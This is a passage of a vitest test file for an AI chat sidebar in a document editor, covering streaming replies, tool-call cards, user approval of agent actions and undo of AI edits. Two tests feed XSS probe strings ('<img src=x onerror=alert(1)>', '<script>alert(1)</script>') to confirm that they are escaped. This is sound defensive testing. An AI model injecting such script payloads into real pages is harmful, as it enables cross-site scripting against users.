// SPDX-License-Identifier: AGPL-3.0-only
//
// The chat sidebar in jsdom, driven through the plugin events exactly like
// the background plugin does (scripts/engine/chatWindow.js, agentLoop.js,
// toolApproval.js, aiEdits.js, selectionSuggestions.js).

import { describe, test, expect, beforeEach, afterEach, vi } from "vitest";
import { act, fireEvent, screen, within } from "@testing-library/preact";
import { render } from "preact";
import fs from "node:fs";
import path from "node:path";
import { start, loadTranslations, PLUGIN_GUID } from "./main";
import { STORAGE_KEY } from "./chat";

let events: Record<string, (data?: any) => void>;
let sent: [string, any][];
let root: HTMLElement;
let plugin: any;

function setup({ editorType = "word", stored }: { editorType?: string; stored?: object } = {}) {
	events = {};
	sent = [];
	localStorage.clear();
	if (stored)
		localStorage.setItem(STORAGE_KEY, JSON.stringify(stored));
	plugin = {
		tr: (s: string) => s,
		attachEvent: (name: string, f: (d?: any) => void) => { events[name] = f; },
		sendToPlugin: (name: string, data?: unknown) => sent.push([name, data === undefined ? undefined : JSON.parse(JSON.stringify(data))]),
		info: { editorType, userName: "Ada" }
	};
	(window as any).Asc = { plugin };
	root = document.createElement("div");
	document.body.appendChild(root);
	const chat = start(plugin, root, localStorage);
	act(() => plugin.init());
	return chat;
}

function fire(name: string, data?: unknown) {
	act(() => events[name](data));
}

const $ = (sel: string) => root.querySelector(sel) as HTMLElement | null;
const $$ = (sel: string) => Array.from(root.querySelectorAll(sel)) as HTMLElement[];
const texts = (sel: string) => $$(sel).map((e) => (e.textContent || "").trim());
const sentNamed = (name: string) => sent.filter((m) => m[0] === name).map((m) => m[1]);
const chatMessages = () => sentNamed("onChatMessage");
const input = () => screen.getByRole("textbox") as HTMLTextAreaElement;

function submit(text: string) {
	fireEvent.input(input(), { target: { value: text } });
	fireEvent.click(screen.getByRole("button", { name: "Send" }));
}

function reply(text: string) {
	fire("onChatReply", text);
	fire("onChatStreamEnd");
}

afterEach(() => {
	if (root) {
		act(() => render(null, root));
		root.remove();
	}
	vi.useRealTimers();
});

describe("startup", () => {
	test("reports ready and shows the welcome panel with prompt buttons", () => {
		setup();
		expect(sent[0]).toEqual(["onWindowReady", {}]);
		expect($(".welcome_text")!.textContent).toContain("Welcome, Ada!");
		fireEvent.click(screen.getByRole("button", { name: "Brainstorm" }));
		expect(input().value).toBe("Brainstorm ideas for ");
		expect(document.activeElement).toBe(input());
	});

	test("restores messages, input and attached text; strips old DOM fields", () => {
		setup({ stored: {
			messages: [
				{ role: "user", content: "Hi", turnId: "t1", $el: {}, btnTips: [] },
				{ role: "assistant", content: ["**Hello**"], activeContentIndex: 0 },
				{ role: "tool", isToolCall: true, functionName: "readDocument", humanName: "Read Document", arguments: "{}", result: "ok" }
			],
			inputValue: "draft",
			attachedText: "Some selected text"
		} });
		expect(texts(".user_message")).toEqual(["Hi"]);
		expect($(".assistant_message strong")!.textContent).toBe("Hello");
		expect(texts(".tool_call_title")).toEqual(["Read Document"]);
		expect(input().value).toBe("draft");
		expect($(".attached_text")!.textContent).toBe("Some selected text");
		fire("onUpdateState");
		const saved = JSON.parse(localStorage.getItem(STORAGE_KEY)!);
		expect(saved.messages[0]).toEqual({ role: "user", content: "Hi", turnId: "t1" });
		expect(saved.messages[2].calls).toEqual([{ arguments: "{}", result: "ok" }]);
		expect(sent.pop()).toEqual(["onUpdateState", undefined]);
	});

	test("sets the plugin GUID from config.json (the SDK can not read it from sidebar/)", () => {
		setup();
		const config = JSON.parse(fs.readFileSync(path.resolve(__dirname, "../../../config.json"), "utf8"));
		expect(PLUGIN_GUID).toBe(config.guid);
		expect(plugin.guid).toBe(config.guid);
	});

	test("a broken stored state is ignored", () => {
		localStorage.setItem(STORAGE_KEY, "{nope");
		events = {};
		setup();
		expect($(".welcome_text")).not.toBeNull();
	});

	test("theme change sets the theme type, body classes and compact radius", () => {
		setup();
		const base = vi.fn();
		plugin.onThemeChangedBase = base;
		(window as any).updateBodyThemeClasses = vi.fn();
		(window as any).updateThemeVariables = vi.fn();
		fire("onThemeChanged", { type: "dark", name: "theme-contrast-dark" });
		expect(base).toHaveBeenCalled();
		expect((window as any).updateBodyThemeClasses).toHaveBeenCalledWith("dark", "theme-contrast-dark");
		expect(document.documentElement.classList.contains("compact-radius")).toBe(true);
		expect(($("button[aria-label=Send] img") as HTMLImageElement).getAttribute("src")).toContain("/icons/dark/btn-demote");
		act(() => plugin.onThemeChanged({ type: "light", name: "theme-white" }));
		expect(document.documentElement.classList.contains("compact-radius")).toBe(false);
	});
});

describe("sending and replies", () => {
	test("a message is sent as { messages, usedTools, turnId } and shows the agent status", () => {
		setup();
		submit("Summarize this");
		const [req] = chatMessages();
		expect(req.messages).toEqual([{ role: "user", content: "Summarize this" }]);
		expect(req.usedTools).toEqual([]);
		expect(req.turnId).toMatch(/^t[a-z0-9]+$/);
		expect(input().value).toBe("");
		expect($(".agent_status")!.textContent).toContain("Thinking");
		// running: Stop instead of Send, a second submit does nothing
		expect(screen.queryByRole("button", { name: "Send" })).toBeNull();
		fireEvent.keyDown(input(), { key: "Enter" });
		expect(chatMessages()).toHaveLength(1);
	});

	test("Enter sends, Shift+Enter and Ctrl+Enter do not", () => {
		setup();
		fireEvent.input(input(), { target: { value: "one" } });
		fireEvent.keyDown(input(), { key: "Enter", shiftKey: true });
		fireEvent.keyDown(input(), { key: "Enter", ctrlKey: true });
		expect(chatMessages()).toHaveLength(0);
		expect(input().value).toBe("one\n");
		fireEvent.keyDown(input(), { key: "Enter" });
		expect(chatMessages()[0].messages[0].content).toBe("one");
	});

	test("empty input is not sent", () => {
		setup();
		submit("   ");
		expect(chatMessages()).toHaveLength(0);
	});

	test("streaming renders markdown progressively and adds the actions at the end", () => {
		setup();
		submit("Hi");
		fire("onChatStreamStart");
		fire("onChatStreamChunk", "# Ti");
		fire("onChatStreamChunk", "tle\n\nSome *text*");
		expect($(".assistant_message h1")!.textContent).toBe("Title");
		expect($(".assistant_message em")!.textContent).toBe("text");
		expect($(".action_buttons_list")).toBeNull();
		fire("onChatStreamEnd"); // end of the stream
		fire("onChatStreamEnd"); // end of the turn (agentLoop.js always sends it)
		expect($(".action_buttons_list")).not.toBeNull();
		expect(screen.getByRole("button", { name: "Send" })).toBeTruthy();
		expect(document.activeElement).toBe(input());
		expect(sentNamed("onSelectionSuggestionsBusy")).toEqual([true, false]);
	});

	test("an empty reply shows the error and its turn is dropped from the history", () => {
		setup();
		submit("Q1");
		reply("  ");
		expect($(".message_content_error_title")!.textContent).toContain("Something went wrong");
		expect($(".message_content_error_desc")!.textContent).toBe("Please try reloading the conversation");
		submit("Q2");
		expect(chatMessages()[1].messages).toEqual([{ role: "user", content: "Q2" }]);
	});

	test("provider errors from the agent loop are shown as the reply", () => {
		setup();
		submit("Q");
		reply("Error: [provider]");
		expect(texts(".assistant_message .span_message")).toEqual(["Error: [provider]"]);
	});

	test("stop sends onStopAgent; a late reply is dropped and an interrupted tool turn is marked", () => {
		setup();
		submit("Do it");
		fire("onToolCallStart", { type: "native", id: "c1", functionName: "editParagraph", humanName: "Edit Paragraph", arguments: "{}" });
		fireEvent.click(screen.getByRole("button", { name: "Stop" }));
		expect(sentNamed("onStopAgent")).toEqual([{}]);
		fire("onChatStreamChunk", "ignored");
		fire("onChatStreamEnd");
		expect(texts(".assistant_message .span_message")).toEqual(["Operation was interrupted."]);
		submit("Again");
		fireEvent.click(screen.getByRole("button", { name: "Stop" }));
		fire("onChatReply", "too late");
		expect(texts(".assistant_message .span_message")).toEqual(["Operation was interrupted."]);
	});

	test("regenerate sends the last question again; delete removes the turn", () => {
		setup();
		submit("First");
		reply("A1");
		submit("Second");
		reply("A2");
		const answers = $$(".assistant_message");
		fireEvent.click(within(answers[1]).getByRole("button", { name: "Update" }));
		expect(chatMessages()[2].messages.at(-1)).toEqual({ role: "user", content: "Second" });
		reply("A3");
		fireEvent.click(within($$(".assistant_message")[0]).getByRole("button", { name: "Delete" }));
		expect(texts(".user_message")).toEqual(["Second", "Second"]);
		submit("Next");
		expect(chatMessages()[3].messages.map((m: any) => m.content)).toEqual(["Second", "A2", "Second", "A3", "Next"]);
	});

	test("insert / replace / comment / review send onChatReplace without eo:// links", () => {
		setup();
		submit("Q");
		reply("See [para 2](eo://word/paragraph/2) &amp; **bold**");
		const msg = $(".assistant_message")!;
		const click = (name: string) => fireEvent.click(within(msg).getByRole("button", { name }));
		click("Insert result");
		click("Replace original text");
		click("In comment");
		click("As review");
		const r = sentNamed("onChatReplace");
		expect(r.map((x: any) => x.type)).toEqual(["insert", "replace", "comment", "review"]);
		expect(r[0].data).toBe("<p>See para 2 &amp; <strong>bold</strong></p>\n");
		expect(r[1].data).toBe("See para 2 & bold\n");
		expect(r[3].data).not.toContain("eo:");
	});

	test("copy puts the markdown without location links on the clipboard", async () => {
		setup();
		const writeText = vi.fn(() => Promise.resolve());
		Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
		submit("Q");
		reply("See [para 2](eo://word/paragraph/2) and **this**");
		fireEvent.click(within($(".assistant_message")!).getByRole("button", { name: "Copy" }));
		expect(writeText).toHaveBeenCalledWith("See para 2 and **this**");
	});

	test("As review is only offered in the document editor", () => {
		setup({ editorType: "cell" });
		submit("Q");
		reply("A");
		expect(within($(".assistant_message")!).queryByRole("button", { name: "As review" })).toBeNull();
		expect(within($(".assistant_message")!).getByRole("button", { name: "In comment" })).toBeTruthy();
	});

	test("attached text is sent with the next message and can be removed", () => {
		setup({ stored: { attachedText: "Selected" } });
		submit("Explain");
		fire("onUpdateState");
		expect(JSON.parse(localStorage.getItem(STORAGE_KEY)!).messages[0].attachedText).toBe("Selected");
		expect($(".attached_text")).toBeNull();
	});

	test("the attached text banner closes with its button", () => {
		setup({ stored: { attachedText: "Selected" } });
		fireEvent.click(screen.getByRole("button", { name: "Remove attached text" }));
		expect($(".attached_text")).toBeNull();
	});

	test("onAttachedText fills the input, or sends right away with forceSend", () => {
		setup();
		fire("onAttachedText", "Draft text");
		expect(input().value).toBe("Draft text");
		fire("onAttachedText", { text: "Improve this ", forceSend: true });
		expect(chatMessages()[0].messages).toEqual([{ role: "user", content: "Improve this" }]);
	});

	test("raw HTML in answers is escaped", () => {
		setup();
		submit("Q");
		reply("<img src=x onerror=alert(1)> <script>alert(1)</script>");
		expect($$(".assistant_message img:not(.icon)")).toHaveLength(0);
		expect($$(".assistant_message script")).toHaveLength(0);
	});
});

describe("agent status line", () => {
	const status = () => $(".agent_status");
	const label = () => $(".agent_status_label")!.textContent;
	const seconds = () => $(".agent_status_time")!.textContent;

	test("shows the model while thinking and the tool while it runs, with ticking seconds", () => {
		vi.useFakeTimers();
		setup();
		expect(status()).toBeNull();
		submit("Read it");
		fire("onAgentStatus", { model: "GPT Test" });
		expect(label()).toBe("Thinking… (GPT Test)");
		expect(seconds()).toBe("0 s");
		act(() => { vi.advanceTimersByTime(3000); });
		expect(seconds()).toBe("3 s");
		fire("onToolCallStart", { type: "native", id: "c1", functionName: "readDocument", humanName: "Read Document", arguments: "{}" });
		expect(label()).toBe("Read Document…");
		fire("onToolCallEnd", { type: "native", id: "c1", functionName: "readDocument", arguments: "{}", result: { message: "ok" } });
		expect(label()).toBe("Thinking… (GPT Test)");
		// one Thinking indicator only (no typing bubble in the log)
		expect(root.textContent!.match(/Thinking/g)).toHaveLength(1);
		// the phase is announced, the seconds are not
		expect($(".agent_status")!.closest("[role=status]")!.getAttribute("aria-live")).toBe("polite");
		expect($(".agent_status_time")!.getAttribute("aria-hidden")).toBe("true");
		reply("Done");
		expect(status()).toBeNull();
	});

	test("stays while text streamed before a tool call ends, clears when the turn ends", () => {
		setup();
		submit("Edit");
		fire("onChatStreamStart");
		fire("onChatStreamChunk", "Let me look.");
		fire("onChatStreamEnd");
		expect(status()).not.toBeNull();
		expect(screen.getByRole("button", { name: "Stop" })).toBeTruthy();
		fire("onToolCallStart", { type: "native", id: "c1", functionName: "readDocument", humanName: "Read Document", arguments: "{}" });
		expect(label()).toBe("Read Document…");
		fire("onToolCallEnd", { type: "native", id: "c1", functionName: "readDocument", arguments: "{}", result: { message: "ok" } });
		fire("onChatStreamEnd");
		expect(status()).toBeNull();
	});

	test("clears on stop", () => {
		setup();
		submit("Go");
		fire("onToolCallStart", { type: "native", id: "c1", functionName: "readDocument", humanName: "Read Document", arguments: "{}" });
		fireEvent.click(screen.getByRole("button", { name: "Stop" }));
		expect(status()).toBeNull();
		fire("onChatStreamEnd");
		expect(status()).toBeNull();
		submit("Again");
		expect(label()).toBe("Thinking…");
	});

	test("clears on error", () => {
		setup();
		submit("Q");
		reply("Error: [provider]");
		expect(status()).toBeNull();
	});

	test("the live region exists before the turn, only its text changes", () => {
		setup();
		const region = $(".agent_status_region")!;
		expect(region.getAttribute("role")).toBe("status");
		expect(region.getAttribute("aria-live")).toBe("polite");
		expect(region.textContent).toBe("");
		submit("Go");
		expect($(".agent_status_region")).toBe(region);
		expect(region.textContent).toContain("Thinking");
		reply("Done");
		expect($(".agent_status_region")).toBe(region);
		expect(region.textContent).toBe("");
	});

	test("the seconds unit is translated", () => {
		setup();
		plugin.tr = (s: string) => (s === "%1 s" ? "%1 Sek." : s);
		submit("Go");
		expect(seconds()).toBe("0 Sek.");
	});

	test("editor-initiated tool calls during a turn leave the status alone", () => {
		setup();
		submit("Go");
		fire("onToolCallStart", { type: "native", id: "c1", functionName: "readDocument", humanName: "Read Document", arguments: "{}" });
		fire("onToolCallStart", { type: "native", id: "e1", functionName: "editParagraph", humanName: "Edit Paragraph", arguments: "{}", source: "editor" });
		expect(label()).toBe("Read Document…");
		fire("onToolCallEnd", { type: "native", id: "e1", functionName: "editParagraph", arguments: "{}", result: { message: "ok" }, source: "editor" });
		expect(label()).toBe("Read Document…");
		fire("onToolCallEnd", { type: "native", id: "x9", functionName: "other", arguments: "{}", result: { message: "ok" } });
		expect(label()).toBe("Read Document…");
		fire("onToolCallEnd", { type: "native", id: "c1", functionName: "readDocument", arguments: "{}", result: { message: "ok" } });
		expect(label()).toBe("Thinking…");
	});

	test("editor-initiated tool calls outside a turn show no status", () => {
		setup();
		fire("onToolCallStart", { type: "native", id: "e1", functionName: "readDocument", humanName: "Read Document", arguments: "{}" });
		expect(status()).toBeNull();
	});
});

describe("agent transcripts and history", () => {
	test("the transcript of a turn is replayed as history in the next request", () => {
		setup();
		submit("Read the document");
		const turnId = chatMessages()[0].turnId;
		fire("onToolCallStart", { type: "native", id: "c1", functionName: "readDocument", humanName: "Read Document", arguments: "{}" });
		fire("onToolCallEnd", { type: "native", id: "c1", functionName: "readDocument", result: { message: "Function executed successfully" } });
		fire("onAgentTranscript", { turnId, hasFinalReply: true, messages: [
			{ role: "assistant", content: null, tool_calls: [{ id: "c1", type: "function", function: { name: "readDocument", arguments: "{}" } }] },
			{ role: "tool", tool_call_id: "c1", content: "Function executed successfully" }
		] });
		reply("It is about cats.");
		submit("Shorter please");
		const req = chatMessages()[1];
		expect(req.messages.map((m: any) => m.role)).toEqual(["user", "assistant", "tool", "assistant", "user"]);
		expect(req.messages[2].tool_call_id).toBe("c1");
		expect(req.messages[3].content).toBe("It is about cats.");
		expect(req.usedTools).toEqual(["readDocument"]);
	});

	test("stored transcripts are capped to the last turns", () => {
		setup();
		const N = (window as any).AgentHistory.HISTORY_STORED_TRANSCRIPT_TURNS;
		for (let n = 0; n < N + 2; n++) {
			submit("Question " + n);
			const turnId = chatMessages()[n].turnId;
			fire("onAgentTranscript", { turnId, hasFinalReply: true, messages: [
				{ role: "assistant", content: null, tool_calls: [{ id: "c" + n, type: "function", function: { name: "readDocument", arguments: "{}" } }] },
				{ role: "tool", tool_call_id: "c" + n, content: "Function executed successfully" }
			] });
			reply("Answer " + n);
		}
		fire("onUpdateState");
		const stored = JSON.parse(localStorage.getItem(STORAGE_KEY)!).messages.filter((m: any) => m.role === "user");
		expect(stored.map((m: any) => !!m.agentTranscript)).toEqual([false, false].concat(Array(N).fill(true)));
	});

	test("restoring an old chat state drops transcripts beyond the cap", () => {
		const AH = (window as any).AgentHistory;
		const N = AH.HISTORY_STORED_TRANSCRIPT_TURNS;
		const messages = [];
		for (let n = 0; n < N + 3; n++) {
			messages.push({ role: "user", content: "Q" + n, turnId: "t" + n, agentTranscript: { hasFinalReply: true, messages: [
				{ role: "assistant", content: null, tool_calls: [{ id: "c" + n, type: "function", function: { name: "readDocument", arguments: "{}" } }] },
				{ role: "tool", tool_call_id: "c" + n, content: "ok" }
			] } });
			messages.push({ role: "assistant", content: ["A" + n], activeContentIndex: 0 });
		}
		setup({ stored: { messages } });
		submit("Next");
		expect(chatMessages().pop().messages.filter((m: any) => m.role === "tool")).toHaveLength(AH.HISTORY_FULL_TOOL_TURNS);
		fire("onUpdateState");
		const stored = JSON.parse(localStorage.getItem(STORAGE_KEY)!).messages.filter((m: any) => m.role === "user");
		expect(stored.filter((m: any) => m.agentTranscript)).toHaveLength(N);
		expect(stored[0].agentTranscript).toBeUndefined();
	});

	test("transcripts for unknown turns are ignored", () => {
		setup();
		submit("Hi");
		fire("onAgentTranscript", { turnId: "nope", hasFinalReply: true, messages: [{ role: "tool", tool_call_id: "x", content: "y" }] });
		fire("onAgentTranscript", null);
		reply("Hello");
		submit("Again");
		expect(chatMessages()[1].messages.map((m: any) => m.role)).toEqual(["user", "assistant", "user"]);
	});
});

describe("tool call cards", () => {
	test("show the name, collapse/expand the arguments and results, and merge repeated calls", () => {
		setup();
		submit("Go");
		fire("onToolCallStart", { type: "native", id: "c1", functionName: "readDocument", humanName: "Read Document", arguments: "{\"a\":1}" });
		const header = () => screen.getByRole("button", { name: /Read Document/ });
		expect(header().getAttribute("aria-expanded")).toBe("false");
		expect($(".tool_call_dots")).not.toBeNull();
		fire("onToolCallEnd", { type: "native", id: "c1", functionName: "readDocument", result: { message: "done" } });
		expect($(".tool_call_dots")).toBeNull();
		fire("onToolCallStart", { type: "native", id: "c2", functionName: "readDocument", humanName: "Read Document", arguments: "{\"a\":2}" });
		fire("onToolCallEnd", { type: "native", id: "c2", functionName: "readDocument", result: "plain" });
		expect($$(".tool_call_message")).toHaveLength(1);
		fireEvent.click(header());
		expect(header().getAttribute("aria-expanded")).toBe("true");
		expect(texts(".tool_call_section pre")).toEqual(["{\"a\":1}", "done", "{\"a\":2}", "plain"]);
		fireEvent.click(header());
		expect($(".tool_call_details")).toBeNull();
	});

	test("long names are truncated when collapsed", () => {
		setup();
		const name = "A".repeat(50);
		fire("onToolCallStart", { type: "native", id: "c1", functionName: "x", humanName: name, arguments: "" });
		expect($(".tool_call_title")!.textContent).toBe("A".repeat(37) + "......");
	});

	test("writeMacro shows the code; prompt-based calls are parsed; the deprecated event still works", () => {
		setup();
		fire("onToolCallStart", { type: "native", id: "m1", functionName: "writeMacro", humanName: "Write Macro", arguments: JSON.stringify({ code: "Api.X()" }) });
		fire("onToolCallStart", { type: "system_prompt", id: "s1", call: "[functionCalling (insertText)]: {\"text\":\"hi\"}" });
		fire("onToolCallEnd", { type: "system_prompt", id: "s1", result: { error: "nope" } });
		fire("onToolCall", { type: "native", functionName: "readDocument", arguments: "{}", result: { error: "bad" } });
		$$(".tool_call_header").forEach((h) => fireEvent.click(h));
		expect(texts(".tool_call_section pre")).toEqual(["Api.X()", "{\n  \"text\": \"hi\"\n}", "nope", "{}", "bad"]);
	});
});

describe("tool approval card", () => {
	function requestApproval(extra = {}) {
		setup();
		submit("Change it");
		fire("onToolCallStart", { type: "native", id: "c1", functionName: "replaceSelection", humanName: "Replace Selection", arguments: "{\n  \"text\": \"Hi\"\n}" });
		fire("onToolApprovalRequest", { id: "approval_1_c1", toolCallId: "c1", functionName: "replaceSelection", humanName: "Replace Selection", arguments: "{\n  \"text\": \"Hi\"\n}", ...extra });
		return screen.getByRole("group", { name: /Allow this action\?/ });
	}

	test("renders the question, the arguments and three buttons on the tool call, and takes focus", () => {
		const box = requestApproval();
		expect(box.querySelector(".tool_call_approval_question")!.textContent).toBe("Allow this action? Replace Selection");
		expect(box.querySelector("pre.tool_call_approval_code")!.textContent).toBe("{\n  \"text\": \"Hi\"\n}");
		expect(within(box).getAllByRole("button").map((b) => b.textContent)).toEqual(["Allow", "Always allow", "Deny"]);
		expect(box.closest(".tool_call_message")!.querySelector(".tool_call_header")).not.toBeNull();
		expect(document.activeElement).toBe(box);
	});

	test.each([["Allow", "allow"], ["Always allow", "always"], ["Deny", "deny"]])("%s sends decision %s once and removes the card", (label, decision) => {
		const box = requestApproval();
		const button = within(box).getByRole("button", { name: label });
		fireEvent.click(button);
		expect(sentNamed("onToolApprovalResponse")).toEqual([{ id: "approval_1_c1", decision }]);
		expect($(".tool_call_approval")).toBeNull();
		fireEvent.click(button);
		expect(sentNamed("onToolApprovalResponse")).toHaveLength(1);
	});

	test("writeMacro shows the code as text and offers a session-only allow", () => {
		setup();
		const code = "Api.GetDocument().GetElement(0).AddText(\"<img src=x onerror=alert(1)>\")";
		fire("onToolCallStart", { type: "native", id: "m1", functionName: "writeMacro", humanName: "Write Macro", arguments: "{}" });
		fire("onToolApprovalRequest", { id: "approval_2_m1", toolCallId: "m1", functionName: "writeMacro", humanName: "Write Macro", arguments: JSON.stringify({ code }), code });
		const box = $(".tool_call_approval")!;
		expect(box.querySelector(".tool_call_approval_label")!.textContent).toBe("The assistant wants to run this macro:");
		expect(box.querySelector("pre.tool_call_approval_code")!.textContent).toBe(code);
		expect(box.querySelectorAll("img")).toHaveLength(0);
		expect(within(box).getAllByRole("button").map((b) => b.textContent)).toEqual(["Allow", "Allow for this session", "Deny"]);
		fireEvent.click(within(box).getByRole("button", { name: "Allow for this session" }));
		expect(sentNamed("onToolApprovalResponse")).toEqual([{ id: "approval_2_m1", decision: "always" }]);
	});

	test("a request without a prior tool call creates its own card; editor requests are labelled", () => {
		setup();
		fire("onToolApprovalRequest", { id: "approval_3_system_1", toolCallId: "system_1", functionName: "editParagraph", humanName: "Edit Paragraph", arguments: "{}", source: "editor" });
		expect($$(".tool_call_approval")).toHaveLength(1);
		expect($$(".tool_call_approval pre")).toHaveLength(0);
		expect(texts(".tool_call_approval_label")).toEqual(["Requested by the editor integration, not by this chat."]);
		// editor requests survive the end of a chat turn
		fire("onChatStreamEnd");
		expect($$(".tool_call_approval")).toHaveLength(1);
	});

	test("the card disappears when the tool call ends, the turn ends or the agent is stopped", () => {
		requestApproval();
		fire("onToolCallEnd", { type: "native", id: "c1", functionName: "replaceSelection", result: { error: "declined" } });
		expect($(".tool_call_approval")).toBeNull();
		fire("onToolApprovalRequest", { id: "approval_2", toolCallId: "c9", functionName: "x", arguments: "{}" });
		fireEvent.click(screen.getByRole("button", { name: "Stop" }));
		expect($(".tool_call_approval")).toBeNull();
		expect(sentNamed("onToolApprovalResponse")).toEqual([]);
	});

	test("ignores malformed requests", () => {
		setup();
		fire("onToolApprovalRequest", null);
		fire("onToolApprovalRequest", { functionName: "x" });
		expect($(".tool_call_approval")).toBeNull();
	});

	test("before/after preview: items, text diff and table, all as text", () => {
		requestApproval({ preview: {
			items: [{ label: "Paragraph", value: 3 }, null],
			text: { before: "old <b>", after: "new" },
			table: { columns: ["A"], rows: [{ label: "1", cells: [{ before: "x", after: "y" }, { before: "same", after: "same" }] }], truncated: true },
			note: "Only the first rows"
		} });
		expect(texts(".tool_call_preview_items dt")).toEqual(["Paragraph"]);
		expect(texts(".tool_call_preview_items dd")).toEqual(["3"]);
		expect(texts(".tool_call_preview_text del")).toEqual(["old <b>"]);
		expect(texts(".tool_call_preview_text ins")).toEqual(["new"]);
		expect(texts(".tool_call_preview_table thead th")).toEqual(["", "A"]);
		expect(texts(".tool_call_preview_table td")).toEqual(["xy", "same"]);
		expect(texts(".tool_call_preview_table td del")).toEqual(["x"]);
		expect(texts(".tool_call_preview_note")).toEqual(["…", "Only the first rows"]);
	});
});

describe("AI edits bar", () => {
	const summary = { turnId: "t1", steps: 2, canUndo: true, undoAvailable: true, revisionCount: 0 };

	test("undo button sends onAIEditsAction, is busy until the result arrives", () => {
		setup();
		submit("Edit");
		reply("Done.");
		fire("onAIEditsSummary", summary);
		const bar = screen.getByRole("group", { name: "AI changes" });
		expect(bar.closest(".assistant_message")!.textContent).toContain("Done.");
		expect(bar.querySelector(".ai_edits_status")!.textContent).toBe("The AI changed the document.");
		const undo = within(bar).getByRole("button", { name: "Undo AI changes" });
		expect(undo.getAttribute("title")).toContain("2 undo steps");
		// the document stays editable during a turn: warn that edits made meanwhile may be undone
		expect(undo.getAttribute("title")).toContain("while the AI was working");
		fireEvent.click(undo);
		expect(sentNamed("onAIEditsAction")).toEqual([{ turnId: "t1", action: "undo" }]);
		expect((within(bar).getByRole("button", { name: "Undo AI changes" }) as HTMLButtonElement).disabled).toBe(true);
		fire("onAIEditsActionResult", { turnId: "t1", action: "undo", ok: true });
		expect($(".ai_edits_status")!.textContent).toBe("AI changes undone.");
		expect(within($(".ai_edits_bar")!).queryByRole("button")).toBeNull();
	});

	test("tracked changes: accept/reject, partial results and hints", () => {
		setup();
		fire("onAIEditsSummary", { turnId: "t2", steps: 3, canUndo: false, revisionCount: 4 });
		// no answer in this turn: a bar of its own
		expect($$(".assistant_message .span_message")).toHaveLength(0);
		expect($(".ai_edits_status")!.textContent).toBe("The AI made 4 tracked changes.");
		expect($(".ai_edits_hint")!.textContent).toBe("To undo, press Ctrl+Z 3 times.");
		fireEvent.click(screen.getByRole("button", { name: "Accept all" }));
		fire("onAIEditsActionResult", { turnId: "t2", action: "accept", left: 1 });
		expect($(".ai_edits_message")!.textContent).toBe("1 changes share a paragraph with other tracked changes. Review them in the Review tab.");
		fireEvent.click(screen.getByRole("button", { name: "Reject all" }));
		fire("onAIEditsActionResult", { turnId: "t2", action: "reject", left: 0 });
		expect($(".ai_edits_status")!.textContent).toBe("AI changes rejected.");
	});

	test("a newer turn makes older undo unavailable; stale undo explains why", () => {
		setup();
		submit("A");
		reply("one");
		fire("onAIEditsSummary", summary);
		submit("B");
		reply("two");
		fire("onAIEditsSummary", { ...summary, turnId: "t3" });
		const [first] = $$(".ai_edits_bar");
		expect((within(first).getByRole("button", { name: "Undo AI changes" }) as HTMLButtonElement).disabled).toBe(true);
		fireEvent.click(within($$(".ai_edits_bar")[1]).getByRole("button", { name: "Undo AI changes" }));
		fire("onAIEditsActionResult", { turnId: "t3", action: "undo", ok: false, reason: "stale" });
		expect($$(".ai_edits_message")[1].textContent).toContain("Not available");
		fire("onAIEditsActionResult", { turnId: "unknown", action: "undo", ok: true });
	});
});

describe("smart action chips", () => {
	const payload = { key: "word|11|abc", summary: "Selected text (11 chars)", actions: [{ id: "improve", text: "Improve writing" }, { id: "continue", text: "Continue writing" }] };
	const chips = () => $(".selection_chips");

	test("render the summary and one button per action", () => {
		setup();
		fire("onSelectionSuggestions", payload);
		expect($(".selection_chips_summary_text")!.textContent).toBe("Selected text (11 chars)");
		expect(texts(".selection_chip")).toEqual(["Improve writing", "Continue writing"]);
		expect(chips()!.getAttribute("aria-label")).toBe("Suggested actions");
	});

	test("an empty action list hides the row; invalid actions are dropped", () => {
		setup();
		fire("onSelectionSuggestions", payload);
		fire("onSelectionSuggestions", { key: "", summary: "", actions: [] });
		expect(chips()).toBeNull();
		fire("onSelectionSuggestions", { key: "k", summary: "s", actions: [{ id: "a" }, null, { id: "b", text: "B" }] });
		expect(texts(".selection_chip")).toEqual(["B"]);
		fire("onSelectionSuggestions", "nonsense");
		expect(texts(".selection_chip")).toEqual(["B"]);
	});

	test("clicking a chip sends onSmartActionChip and hides the chips", () => {
		setup();
		fire("onSelectionSuggestions", payload);
		fireEvent.click(screen.getByRole("button", { name: "Continue writing" }));
		expect(sentNamed("onSmartActionChip")).toEqual([{ id: "continue" }]);
		expect(chips()).toBeNull();
		expect(sentNamed("onSelectionSuggestionsBusy")).toEqual([]);
	});

	test("dismiss hides them until the selection changes; Escape dismisses too", () => {
		setup();
		fire("onSelectionSuggestions", payload);
		fireEvent.click(screen.getByRole("button", { name: "Dismiss suggestions" }));
		expect(chips()).toBeNull();
		expect(document.activeElement).toBe(input());
		fire("onSelectionSuggestions", payload);
		expect(chips()).toBeNull();
		fire("onSelectionSuggestions", { ...payload, key: "word|5|def" });
		expect(chips()).not.toBeNull();
		fireEvent.keyDown(screen.getByRole("button", { name: "Improve writing" }), { key: "Escape" });
		expect(chips()).toBeNull();
	});

	test("hidden while the agent runs; the plugin is told once per change", () => {
		setup();
		fire("onSelectionSuggestions", payload);
		submit("Q");
		expect(chips()).toBeNull();
		expect(sentNamed("onSelectionSuggestionsBusy")).toEqual([true]);
		reply("A");
		expect(sentNamed("onSelectionSuggestionsBusy")).toEqual([true, false]);
		expect(chips()).not.toBeNull();
	});
});

describe("document location links", () => {
	test("valid eo:// links become location chips that send onNavigate", () => {
		setup();
		const opened: string[] = [];
		window.open = ((url: string) => { opened.push(url); return null; }) as any;
		reply("See [paragraph 3](eo://word/paragraph/3), [bad](eo://word/paragraph/0) and [web](https://example.com).");
		const chip = $("a.eo_location_link")!;
		expect($$("a.eo_location_link")).toHaveLength(1);
		expect(chip.getAttribute("role")).toBe("button");
		expect(chip.getAttribute("title")).toBe("Go to location: ¶ 3");
		expect($$("a").filter((a) => a.textContent === "bad")).toHaveLength(0);
		expect($(".assistant_message")!.textContent).toContain("bad");
		fireEvent.click(chip);
		expect(sentNamed("onNavigate")).toEqual([{ href: "eo://word/paragraph/3" }]);
		expect(opened).toEqual([]);
		fireEvent.click($$("a").find((a) => a.textContent === "web")!);
		expect(opened).toEqual(["https://example.com/"]);
	});

	test("no navigation while the agent runs", () => {
		setup();
		reply("[p](eo://word/paragraph/1)");
		submit("Q");
		fireEvent.click($("a.eo_location_link")!);
		expect(sentNamed("onNavigate")).toEqual([]);
	});

	test("only http(s), mailto and eo links are links", () => {
		setup();
